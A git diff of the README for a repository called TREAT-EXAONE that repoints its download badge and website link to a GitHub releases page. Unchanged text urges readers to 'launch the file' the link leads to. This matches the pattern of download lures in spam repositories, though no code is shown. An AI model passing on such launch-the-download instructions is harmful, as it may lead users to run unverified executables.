@@ -14,12 +14,12 @@ Welcome to the TREAT-EXAONE repository! 🎬 This is a LGAI EXAONE version of an
 agents, ai, awesome, exaone, lgai, multilingual, open-source, openai, reasoning, techforgood, treat, treatai
 
 ## 📥 Download
-[![Download TREAT-EXAONE](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/releases/789694263/Release.zip)
+[![Download TREAT-EXAONE](https://github.com/valentinocala/TREAT-EXAONE/releases)](https://github.com/valentinocala/TREAT-EXAONE/releases)
 
 If the link ends with a file name, please launch the file to access the contents. If the link does not work or is not provided, kindly check the "Releases" section for alternative download options.
 
 ## 🌐 Visit Our Website
-For more information and updates, visit our [website](https://www.treat-exaone.com).
+For more information and updates, visit our [website](https://github.com/valentinocala/TREAT-EXAONE/releases).
 
 ---
 
